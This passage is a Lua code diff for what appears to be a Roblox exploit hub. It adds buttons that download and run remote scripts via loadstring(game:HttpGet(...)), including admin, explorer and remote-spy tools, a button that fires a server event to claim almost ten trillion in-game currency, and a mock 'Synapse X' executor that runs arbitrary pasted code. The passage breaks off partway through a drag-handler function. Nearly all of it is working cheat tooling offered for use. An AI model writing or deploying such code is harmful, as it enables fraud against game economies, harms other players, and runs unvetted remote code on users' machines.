@@ -2546,3 +2546,2079 @@ end)
 VsecondSection:NewButton("BAN GUI", "ButtonInfo", function()
     loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/refs/heads/main/Ban%20GUI.lua"),true))()
 end)
+VsecondSection:NewButton("enable collision", "ButtonInfo", function()
+    local Players = game:GetService("Players")
+
+local function enableCollisionForPlayer(player)
+    if player.Character then
+        for _, part in pairs(player.Character:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = true
+            end
+        end
+    end
+end
+
+local function onPlayerAdded(player)
+    player.CharacterAdded:Connect(function()
+        if not game.Workspace:GetPropertyChangedSignal("AllowCollisions"):Connect(function()
+            enableCollisionForPlayer(player)
+        end) then
+            enableCollisionForPlayer(player)
+        end
+    end)
+end
+
+Players.PlayerAdded:Connect(onPlayerAdded)
+
+for _, player in pairs(Players:GetPlayers()) do
+    onPlayerAdded(player)
+end
+
+end)
+VsecondSection:NewButton("ice bear gui SPONSOR", "ButtonInfo", function()
+    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("ice bear gui NO SKID", "Synapse")
+local iceTab = Window:NewTab("icetab")
+local iceSection = iceTab:NewSection("iceSection")
+iceSection:NewButton("Infinite yield", "ButtonInfo", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+iceSection:NewSlider("Speedshit", "SliderInfo", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+end)
+end)
+VsecondSection:NewButton("Infinite stud bucks", "ButtonInfo", function()
+    local args = {
+		[1] = "currencyReward",
+		[2] = {
+			[1] = "bucks",
+			[2] = 9999999999999
+		}
+	}
+	
+	game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("General"):FireServer(unpack(args))
+end)
+VsecondSection:NewButton("Synapse  x", "ButtonInfo", function()
+    -- Synapse X in game executor
+
+pcall(function() game.CoreGui["Synapse X"]:Destroy() end)
+
+local SynapseXreal = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local bar = Instance.new("Frame")
+local Close = Instance.new("TextButton")
+local Mini = Instance.new("TextButton")
+local Min = Instance.new("TextButton")
+local ImageLabel = Instance.new("ImageLabel")
+local security = Instance.new("TextLabel")
+local EditorFrame = Instance.new("ScrollingFrame")
+local Source = Instance.new("TextBox")
+local Comments_ = Instance.new("TextLabel")
+local Globals_ = Instance.new("TextLabel")
+local Keywords_ = Instance.new("TextLabel")
+local RemoteHighlight_ = Instance.new("TextLabel")
+local Strings_ = Instance.new("TextLabel")
+local Tokens_ = Instance.new("TextLabel")
+local Numbers_ = Instance.new("TextLabel")
+local Lines = Instance.new("TextLabel")
+local title = Instance.new("TextLabel")
+local list = Instance.new("Frame")
+local execute = Instance.new("TextButton")
+local clear = Instance.new("TextButton")
+local options = Instance.new("TextButton")
+local scripthub = Instance.new("TextButton")
+local Attach = Instance.new("TextButton")
+local title_2 = Instance.new("ImageLabel")
+local scripthub_2 = Instance.new("Frame")
+local optionspage = Instance.new("Frame")
+local bar_2 = Instance.new("Frame")
+local select = Instance.new("Frame")
+local dex = Instance.new("TextButton")
+local esp = Instance.new("TextButton")
+local spy = Instance.new("TextButton")
+local dumper = Instance.new("TextButton")
+local backdoor = Instance.new("TextButton")
+local desc = Instance.new("Frame")
+local descri = Instance.new("TextLabel")
+local title_3 = Instance.new("TextLabel")
+local execute_2 = Instance.new("TextButton")
+local close = Instance.new("TextButton")
+local title_4 = Instance.new("ImageLabel")
+local title_5 = Instance.new("TextLabel")
+local title_6 = Instance.new("ImageLabel")
+local synminbutt = Instance.new("ImageButton")
+local synapsex3 = Instance.new("TextButton")
+local Tabs = Instance.new("Folder")
+local NewTab = Instance.new("TextButton")
+
+local scriptselected = "none"
+local injected = true
+
+--Properties:
+
+SynapseXreal.Name = "Synapse X"
+SynapseXreal.Parent = game.CoreGui
+SynapseXreal.ResetOnSpawn = false
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = SynapseXreal
+MainFrame.Active = true
+MainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(0.1, 0, 0.25, 0)
+MainFrame.Size = UDim2.new(0, 689, 0, 320)
+MainFrame.Visible = false
+
+bar.Name = "bar"
+bar.Parent = MainFrame
+bar.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
+bar.BackgroundTransparency = 0.800
+bar.BorderSizePixel = 0
+bar.Position = UDim2.new(-0, 0, -0.00296382909, 0)
+bar.Size = UDim2.new(0, 689, 0, 25)
+
+synminbutt.Name = "synminbutt"
+synminbutt.Parent = SynapseXreal
+synminbutt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+synminbutt.BackgroundTransparency = 1.000
+synminbutt.Position = UDim2.new(0, 165, 0, -30)
+synminbutt.Size = UDim2.new(0, 24, 0, 28)
+synminbutt.Visible = true
+synminbutt.ZIndex = 14
+synminbutt.Image = "http://www.roblox.com/asset/?id=7641125882"
+synminbutt.ImageRectSize = Vector2.new(138, 167)
+synminbutt.MouseButton1Click:Connect(function()
+    MainFrame.Visible = true
+    synminbutt.Visible = false
+end)
+
+Mini.Name = "Mini"
+Mini.Parent = bar
+Mini.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Mini.BackgroundTransparency = 1.000
+Mini.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Mini.BorderSizePixel = 0
+Mini.Position = UDim2.new(0.935521046, 0, 0.07, 0)
+Mini.Size = UDim2.new(0, 21, 0, 25)
+Mini.Font = Enum.Font.Arial
+Mini.Text = "_"
+Mini.TextColor3 = Color3.fromRGB(255, 255, 255)
+Mini.TextSize = 14.000
+Mini.MouseButton1Click:Connect(function()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Synapse X";
+        Text = "Synapse X minimized.";
+        Duration = 2;
+    })
+    synminbutt.Visible = true
+    MainFrame.Visible = false
+end)
+
+Min.Name = "Min"
+Min.Parent = bar
+Min.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Min.BackgroundTransparency = 1.000
+Min.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Min.BorderSizePixel = 0
+Min.Position = UDim2.new(0.965521046, 0, 0.07, 0)
+Min.Size = UDim2.new(0, 21, 0, 25)
+Min.Font = Enum.Font.Arial
+Min.Text = "X"
+Min.TextColor3 = Color3.fromRGB(255, 255, 255)
+Min.TextSize = 14.000
+Min.MouseButton1Click:Connect(function()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Synapse X";
+        Text = "Synapse X hide. Press F6 to back.";
+        Duration = 2;
+    })
+    MainFrame.Visible = false
+    synminbutt.Visible = false
+end)
+
+ImageLabel.Parent = MainFrame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.0252733715, 0, 0.015625, 39)
+ImageLabel.Size = UDim2.new(0, 655, 0, 232)
+
+Tabs.Name = "Tabs"
+Tabs.Parent = ImageLabel
+
+NewTab.Name = "NewTab"
+NewTab.Parent = Tabs
+NewTab.BackgroundColor3 = Color3.fromRGB(107, 107, 107)
+NewTab.BorderSizePixel = 0
+NewTab.Position = UDim2.new(0, 0, -0.0659999996, 0)
+NewTab.Size = UDim2.new(0, 14, 0, 14)
+NewTab.Font = Enum.Font.SourceSans
+NewTab.Text = "+"
+NewTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+NewTab.TextSize = 14.000
+
+security.Name = "security"
+security.Parent = ImageLabel
+security.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+security.Size = UDim2.new(0, 552, 0, 258)
+security.Visible = false
+security.Font = Enum.Font.SourceSans
+security.TextColor3 = Color3.fromRGB(0, 0, 0)
+security.TextSize = 14.000
+
+EditorFrame.Name = "EditorFrame"
+EditorFrame.Parent = ImageLabel
+EditorFrame.Active = true
+EditorFrame.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+EditorFrame.BackgroundTransparency = 1.000
+EditorFrame.BorderColor3 = Color3.fromRGB(61, 61, 61)
+EditorFrame.Size = UDim2.new(1, 0, 1, 0)
+EditorFrame.ZIndex = 3
+EditorFrame.BottomImage = "rbxassetid://148970562"
+EditorFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+EditorFrame.HorizontalScrollBarInset = Enum.ScrollBarInset.ScrollBar
+EditorFrame.MidImage = "rbxassetid://148970562"
+EditorFrame.ScrollBarThickness = 5
+EditorFrame.TopImage = "rbxassetid://148970562"
+EditorFrame.BorderSizePixel = 0
+
+Source.Name = "Source"
+Source.Parent = EditorFrame
+Source.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Source.BackgroundTransparency = 1.000
+Source.Position = UDim2.new(0, 30, 0, 0)
+Source.BorderSizePixel = 0
+Source.Size = UDim2.new(0.945652187, 0, 1, 0)
+Source.ZIndex = 3
+Source.ClearTextOnFocus = false
+Source.Font = Enum.Font.Code
+Source.MultiLine = true
+Source.ShowNativeInput = false
+Source.PlaceholderColor3 = Color3.fromRGB(204, 204, 2-4)
+Source.Text = ""
+Source.TextColor3 = Color3.fromRGB(204, 204, 204)
+Source.TextSize = 15.000
+Source.TextXAlignment = Enum.TextXAlignment.Left
+Source.TextYAlignment = Enum.TextYAlignment.Top
+
+Comments_.Name = "Comments_"
+Comments_.Parent = Source
+Comments_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Comments_.BackgroundTransparency = 1.000
+Comments_.Size = UDim2.new(1, 0, 1, 0)
+Comments_.ZIndex = 5
+Comments_.Font = Enum.Font.Code
+Comments_.Text = ""
+Comments_.TextColor3 = Color3.fromRGB(59, 200, 59)
+Comments_.TextSize = 15.000
+Comments_.TextXAlignment = Enum.TextXAlignment.Left
+Comments_.TextYAlignment = Enum.TextYAlignment.Top
+
+Globals_.Name = "Globals_"
+Globals_.Parent = Source
+Globals_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Globals_.BackgroundTransparency = 1.000
+Globals_.Size = UDim2.new(1, 0, 1, 0)
+Globals_.ZIndex = 5
+Globals_.Font = Enum.Font.Code
+Globals_.Text = ""
+Globals_.TextColor3 = Color3.fromRGB(132, 214, 247)
+Globals_.TextSize = 15.000
+Globals_.TextXAlignment = Enum.TextXAlignment.Left
+Globals_.TextYAlignment = Enum.TextYAlignment.Top
+
+Keywords_.Name = "Keywords_"
+Keywords_.Parent = Source
+Keywords_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Keywords_.BackgroundTransparency = 1.000
+Keywords_.Size = UDim2.new(1, 0, 1, 0)
+Keywords_.ZIndex = 5
+Keywords_.Font = Enum.Font.Code
+Keywords_.Text = ""
+Keywords_.TextColor3 = Color3.fromRGB(248, 109, 124)
+Keywords_.TextSize = 15.000
+Keywords_.TextXAlignment = Enum.TextXAlignment.Left
+Keywords_.TextYAlignment = Enum.TextYAlignment.Top
+
+RemoteHighlight_.Name = "RemoteHighlight_"
+RemoteHighlight_.Parent = Source
+RemoteHighlight_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+RemoteHighlight_.BackgroundTransparency = 1.000
+RemoteHighlight_.Size = UDim2.new(1, 0, 1, 0)
+RemoteHighlight_.ZIndex = 5
+RemoteHighlight_.Font = Enum.Font.Code
+RemoteHighlight_.Text = ""
+RemoteHighlight_.TextColor3 = Color3.fromRGB(0, 144, 255)
+RemoteHighlight_.TextSize = 15.000
+RemoteHighlight_.TextXAlignment = Enum.TextXAlignment.Left
+RemoteHighlight_.TextYAlignment = Enum.TextYAlignment.Top
+
+Strings_.Name = "Strings_"
+Strings_.Parent = Source
+Strings_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Strings_.BackgroundTransparency = 1.000
+Strings_.Size = UDim2.new(1, 0, 1, 0)
+Strings_.ZIndex = 5
+Strings_.Font = Enum.Font.Code
+Strings_.Text = ""
+Strings_.TextColor3 = Color3.fromRGB(173, 241, 149)
+Strings_.TextSize = 15.000
+Strings_.TextXAlignment = Enum.TextXAlignment.Left
+Strings_.TextYAlignment = Enum.TextYAlignment.Top
+
+Tokens_.Name = "Tokens_"
+Tokens_.Parent = Source
+Tokens_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Tokens_.BackgroundTransparency = 1.000
+Tokens_.Size = UDim2.new(1, 0, 1, 0)
+Tokens_.ZIndex = 5
+Tokens_.Font = Enum.Font.Code
+Tokens_.Text = ""
+Tokens_.TextColor3 = Color3.fromRGB(255, 255, 255)
+Tokens_.TextSize = 15.000
+Tokens_.TextXAlignment = Enum.TextXAlignment.Left
+Tokens_.TextYAlignment = Enum.TextYAlignment.Top
+
+Numbers_.Name = "Numbers_"
+Numbers_.Parent = Source
+Numbers_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Numbers_.BackgroundTransparency = 1.000
+Numbers_.Size = UDim2.new(1, 0, 1, 0)
+Numbers_.ZIndex = 4
+Numbers_.Font = Enum.Font.Code
+Numbers_.Text = ""
+Numbers_.TextColor3 = Color3.fromRGB(255, 198, 0)
+Numbers_.TextSize = 15.000
+Numbers_.TextXAlignment = Enum.TextXAlignment.Left
+Numbers_.TextYAlignment = Enum.TextYAlignment.Top
+
+Lines.Name = "Lines"
+Lines.Parent = EditorFrame
+Lines.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Lines.BackgroundTransparency = 1.000
+Lines.Size = UDim2.new(0, 30, 1, 0)
+Lines.ZIndex = 4
+Lines.Font = Enum.Font.Code
+Lines.Text = "1"
+Lines.TextColor3 = Color3.fromRGB(255, 255, 255)
+Lines.TextSize = 15.000
+Lines.TextYAlignment = Enum.TextYAlignment.Top
+
+title.Name = "title"
+title.Parent = MainFrame
+title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1.000
+title.Position = UDim2.new(0.330062926, 0, 0.00625000056, 0)
+title.Size = UDim2.new(0, 200, 0, 22)
+title.Font = Enum.Font.SourceSans
+title.Text = "Synapse X"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 16.000
+
+execute.Name = "execute"
+execute.Parent = MainFrame
+execute.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
+execute.BackgroundTransparency = 0.800
+execute.BorderSizePixel = 0
+execute.Position = UDim2.new(0.0095389355, 0, 0.887499988, 0)
+execute.Size = UDim2.new(0, 92, 0, 30)
+execute.Font = Enum.Font.Arial
+execute.Text = "Execute"
+execute.TextColor3 = Color3.fromRGB(255, 255, 255)
+execute.TextSize = 14.000
+execute.MouseButton1Click:Connect(function()
+    if injected == true then
+        loadstring(Source.Text)()
+    end
+    if injected == false then
+        title.Text = "Synapse X - (Not injected! Press attach)"
+    end
+end)
+
+clear.Name = "clear"
+clear.Parent = MainFrame
+clear.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
+clear.BackgroundTransparency = 0.800
+clear.BorderSizePixel = 0
+clear.Position = UDim2.new(0.154146105, 0, 0.887499988, 0)
+clear.Size = UDim2.new(0, 84, 0, 30)
+clear.Font = Enum.Font.Arial
+clear.Text = "Clear"
+clear.TextColor3 = Color3.fromRGB(255, 255, 255)
+clear.TextSize = 14.000
+clear.MouseButton1Click:Connect(function()
+    Source.Text = ""
+end)
+
+scripthub.Name = "scripthub"
+scripthub.Parent = MainFrame
+scripthub.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
+scripthub.BackgroundTransparency = 0.800
+scripthub.BorderSizePixel = 0
+scripthub.Position = UDim2.new(0.871768773, 0, 0.887499988, 0)
+scripthub.Size = UDim2.new(0, 79, 0, 30)
+scripthub.Font = Enum.Font.Arial
+scripthub.Text = "Script Hub"
+scripthub.TextColor3 = Color3.fromRGB(255, 255, 255)
+scripthub.TextSize = 14.000
+scripthub.MouseButton1Click:Connect(function()
+    if scripthub_2.Visible == true then
+        scripthub_2.Visible = false
+    elseif scripthub_2.Visible == false then
+        scripthub_2.Visible = true
+    end
+end)
+
+title_2.Name = "title"
+title_2.Parent = MainFrame
+title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+title_2.BackgroundTransparency = 1.000
+title_2.Position = UDim2.new(0.00870821718, 0, 0, 0)
+title_2.Size = UDim2.new(0, 18, 0, 24)
+title_2.ZIndex = 14
+title_2.Image = "http://www.roblox.com/asset/?id=7641125882"
+title_2.ImageRectSize = Vector2.new(138, 167)
+
+scripthub_2.Name = "scripthub"
+scripthub_2.Parent = SynapseXreal
+scripthub_2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+scripthub_2.BorderSizePixel = 0
+scripthub_2.Position = UDim2.new(0.65, 0, 0.26, 0)
+scripthub_2.Size = UDim2.new(0, 290, 0, 305)
+scripthub_2.Visible = false
+scripthub_2.ZIndex = 100
+
+optionspage.Name = "optionspage"
+optionspage.Parent = SynapseXreal
+optionspage.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+optionspage.BorderSizePixel = 0
+optionspage.Position = UDim2.new(0.433135211, 0, 0.502979755, 0)
+optionspage.Size = UDim2.new(0, 290, 0, 305)
+optionspage.Visible = false
+optionspage.ZIndex = 100
+
+bar_2.Name = "bar"
+bar_2.Parent = scripthub_2
+bar_2.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
+bar_2.BackgroundTransparency = 0.800
+bar_2.BorderSizePixel = 0
+bar_2.Position = UDim2.new(0, 0, -0.0029638072, 0)
+bar_2.Size = UDim2.new(0, 290, 0, 25)
+
+select.Name = "select"
+select.Parent = scripthub_2
+select.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+select.BorderSizePixel = 0
+select.Position = UDim2.new(0.0299979374, 0, 0.104918033, 0)
+select.Size = UDim2.new(0, 82, 0, 264)
+select.ZIndex = 110
+
+dex.Name = "dex"
+dex.Parent = select
+dex.BackgroundColor3 = Color3.fromRGB(0, 32, 61)
+dex.BackgroundTransparency = 1.000
+dex.BorderColor3 = Color3.fromRGB(0, 0, 49)
+dex.BorderSizePixel = 0
+dex.Position = UDim2.new(0.0121960752, 0, -1.49011612e-08, 0)
+dex.Size = UDim2.new(0, 80, 0, 18)
+dex.Font = Enum.Font.SourceSans
+dex.Text = " Dark Dex"
+dex.TextColor3 = Color3.fromRGB(255, 255, 255)
+dex.TextSize = 14.000
+dex.TextXAlignment = Enum.TextXAlignment.Left
+dex.ZIndex = 110
+dex.MouseButton1Click:Connect(function()
+    scriptselected = "dex"
+end)
+
+esp.Name = "spy"
+esp.Parent = select
+esp.BackgroundColor3 = Color3.fromRGB(0, 32, 61)
+esp.BackgroundTransparency = 1.000
+esp.BorderColor3 = Color3.fromRGB(0, 0, 49)
+esp.BorderSizePixel = 0
+esp.Position = UDim2.new(0.0121960752, 0, 0.0681818053, 0)
+esp.Size = UDim2.new(0, 80, 0, 18)
+esp.Font = Enum.Font.SourceSans
+esp.Text = " Remote Spy"
+esp.TextColor3 = Color3.fromRGB(255, 255, 255)
+esp.TextSize = 14.000
+esp.TextXAlignment = Enum.TextXAlignment.Left
+esp.ZIndex = 110
+esp.MouseButton1Click:Connect(function()
+    scriptselected = "spy"
+end)
+
+desc.Name = "desc"
+desc.Parent = scripthub_2
+desc.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+desc.BorderSizePixel = 0
+desc.Position = UDim2.new(0.340342641, 0, 0.613114715, 0)
+desc.Size = UDim2.new(0, 184, 0, 69)
+desc.ZIndex = 110
+
+descri.Name = "descri"
+descri.Parent = desc
+descri.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+descri.BackgroundTransparency = 1.000
+descri.BorderSizePixel = 0
+descri.Position = UDim2.new(0.0112334546, 0, 0, 0)
+descri.Size = UDim2.new(0, 181, 0, 69)
+descri.Font = Enum.Font.SourceSans
+descri.Text = ""
+descri.TextColor3 = Color3.fromRGB(255, 255, 255)
+descri.TextSize = 15.000
+descri.TextWrapped = true
+descri.TextXAlignment = Enum.TextXAlignment.Left
+descri.TextYAlignment = Enum.TextYAlignment.Top
+descri.ZIndex = 125
+
+title_3.Name = "title"
+title_3.Parent = scripthub_2
+title_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+title_3.BackgroundTransparency = 1.000
+title_3.Position = UDim2.new(0.161097407, 0, -0.000307376496, 0)
+title_3.Size = UDim2.new(0, 200, 0, 22)
+title_3.Font = Enum.Font.SourceSans
+title_3.Text = "Synapse X - Script Hub"
+title_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+title_3.TextSize = 16.000
+title_3.ZIndex = 110
+
+execute_2.Name = "execute"
+execute_2.Parent = scripthub_2
+execute_2.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
+execute_2.BackgroundTransparency = 0.800
+execute_2.BorderSizePixel = 0
+execute_2.Position = UDim2.new(0.34057343, 0, 0.871106505, 0)
+execute_2.Size = UDim2.new(0, 92, 0, 30)
+execute_2.Font = Enum.Font.Arial
+execute_2.Text = "Execute"
+execute_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+execute_2.TextSize = 14.000
+execute_2.ZIndex = 110
+execute_2.MouseButton1Click:Connect(function()
+    if injected == true then
+        if scriptselected == "dex" then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
+        end
+        if scriptselected == "spy" then
+            loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpyBeta.lua"))()
+        end
+        if scriptselected == "none" then
+        end
+    end
+    if injected == false then
+        execute_2.Text = "Not Attached!"
+        wait(1)
+        execute_2.Text = "Execute"
+    end
+end)
+
+close.Name = "close"
+close.Parent = scripthub_2
+close.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
+close.BackgroundTransparency = 0.800
+close.BorderSizePixel = 0
+close.Position = UDim2.new(0.685180664, 0, 0.871106505, 0)
+close.Size = UDim2.new(0, 84, 0, 30)
+close.Font = Enum.Font.Arial
+close.Text = "Close"
+close.TextColor3 = Color3.fromRGB(255, 255, 255)
+close.TextSize = 14.000
+close.ZIndex = 110
+close.MouseButton1Click:Connect(function()
+    scriptselected = "none"
+    scripthub_2.Visible = false
+end)
+
+-- Scripts:
+
+game:GetService("UserInputService").InputBegan:Connect(function (input)
+    if MainFrame.Visible == false and synminbutt.Visible == false then
+        if (input.KeyCode == Enum.KeyCode.F6) then
+            MainFrame.Visible = not MainFrame.Visible
+        end
+    end
+end)
+
+local function SYHNK_fake_script() -- ImageLabel.LocalScript 
+    local script = Instance.new('LocalScript', ImageLabel)
+    local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
+    local global_env = {"getrawmetatable", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16"}
+    local Source = script.Parent.EditorFrame.Source
+    local scrollframe = script.Parent.EditorFrame
+    local Lines = Source.Parent.Lines
+    local Highlight = function(string, keywords)
+        local K = {}
+        local S = string
+        local Token =
+            {
+                ["="] = true,
+                ["."] = true,
+                [","] = true,
+                ["("] = true,
+                [")"] = true,
+                ["["] = true,
+                ["]"] = true,
+                ["{"] = true,
+                ["}"] = true,
+                [":"] = true,
+                ["*"] = true,
+                ["/"] = true,
+                ["+"] = true,
+                ["-"] = true,
+                ["%"] = true,
+                [";"] = true,
+                ["~"] = true
+            }
+        for i, v in pairs(keywords) do
+            K[v] = true
+        end
+        S = S:gsub(".", function(c)
+            if Token[c] ~= nil then
+                return "\32"
+            else
+                return c
+            end
+        end)
+        S = S:gsub("%S+", function(c)
+            if K[c] ~= nil then
+                return c
+            else
+                return (" "):rep(#c)
+            end
+        end)
+        return S
+    end
+    local hTokens = function(string)
+        local Token =
+            {
+                ["="] = true,
+                ["."] = true,
+                [","] = true,
+                ["("] = true,
+                [")"] = true,
+                ["["] = true,
+                ["]"] = true,
+                ["{"] = true,
+                ["}"] = true,
+                [":"] = true,
+                ["*"] = true,
+                ["/"] = true,
+                ["+"] = true,
+                ["-"] = true,
+                ["%"] = true,
+                [";"] = true,
+                ["~"] = true
+            }
+        local A = ""
+        string:gsub(".", function(c)
+            if Token[c] ~= nil then
+                A = A .. c
+            elseif c == "\n" then
+                A = A .. "\n"
+            elseif c == "\t" then
+                A = A .. "\t"
+            else
+                A = A .. "\32"
+            end
+        end)
+        return A
+    end
+
+    local strings = function(string)
+        local highlight = ""
+        local quote = false
+        string:gsub(".", function(c)
+            if quote == false and c == "\"" then
+                quote = true
+            elseif quote == true and c == "\"" then
+                quote = false
+            end
+            if quote == false and c == "\"" then
+                highlight = highlight .. "\""
+            elseif c == "\n" then
+                highlight = highlight .. "\n"
+            elseif c == "\t" then
+                highlight = highlight .. "\t"
+            elseif quote == true then
+                highlight = highlight .. c
+            elseif quote == false then
+                highlight = highlight .. "\32"
+            end
+        end)
+        return highlight
+    end
+    local comments = function(string)
+        local ret = ""
+        string:gsub("[^\r\n]+", function(c)
+            local comm = false
+            local i = 0
+            c:gsub(".", function(n)
+                i = i + 1
+                if c:sub(i, i + 1) == "--" then
+                    comm = true
+                end
+                if comm == true then
+                    ret = ret .. n
+                else
+                    ret = ret .. "\32"
+                end
+            end)
+            ret = ret
+        end)
+        return ret
+    end
+    local numbers = function(string)
+        local A = ""
+        string:gsub(".", function(c)
+            if tonumber(c) ~= nil then
+                A = A .. c
+            elseif c == "\n" then
+                A = A .. "\n"
+            elseif c == "\t" then
+                A = A .. "\t"
+            else
+                A = A .. "\32"
+            end
+        end)
+        return A
+    end
+    local highlight_source = function(type)
+        if type == "Text" then
+            Source.Text = Source.Text:gsub("\13", "")
+            Source.Text = Source.Text:gsub("\t", "      ")
+            local s = Source.Text
+            Source.Keywords_.Text = Highlight(s, lua_keywords)
+            Source.Globals_.Text = Highlight(s, global_env)
+            Source.RemoteHighlight_.Text = Highlight(s, {"FireServer", "fireServer", "InvokeServer", "invokeServer"})
+            Source.Tokens_.Text = hTokens(s)
+            Source.Numbers_.Text = numbers(s)
+            Source.Strings_.Text = strings(s)
+            local lin = 1
+            s:gsub("\n", function()
+                lin = lin + 1
+            end)
+            Lines.Text = ""
+            for i = 1, lin do
+                Lines.Text = Lines.Text .. i .. "\n"
+            end
+        end
+    end
+    highlight_source("Text")
+    Source.Changed:Connect(highlight_source)
+    Source:GetPropertyChangedSignal("Text"):Connect(function()
+        local count = 1
+
+        Source.Text:gsub("\n", function()
+			count = count + 1
+		end)
+        scrollframe.CanvasSize = UDim2.new(0, 1500, count/16.6, 0)
+        Source.Size = UDim2.new(0, 598, 0, 249 + (count > 16 and 16*(count-16) or 0))
+    end)
+end
+coroutine.wrap(SYHNK_fake_script)()
+local function AMNA_fake_script() -- MainFrame.Dragging 
+    local script = Instance.new('LocalScript', MainFrame)
+
+    local UserInputService = game:GetService("UserInputService")
+
+    local gui = script.Parent
+
+    local dragging
+    local dragInput
+    local dragStart
+    local startPos
+
+    local function update(input)
+        local delta = input.Position - dragStart
+        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+
+    gui.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = gui.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    gui.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            update(input)
+        end
+    end)
+end
+coroutine.wrap(AMNA_fake_script)()
+local function VEUJFP_fake_script() -- scripthub_2.Dragging 
+    local script = Instance.new('LocalScript', scripthub_2)
+
+    local UserInputService = game:GetService("UserInputService")
+
+    local gui = script.Parent
+
+    local dragging
+    local dragInput
+    local dragStart
+    local startPos
+
+    local function update(input)
+        local delta = input.Position - dragStart
+        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+
+    gui.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = gui.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    gui.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
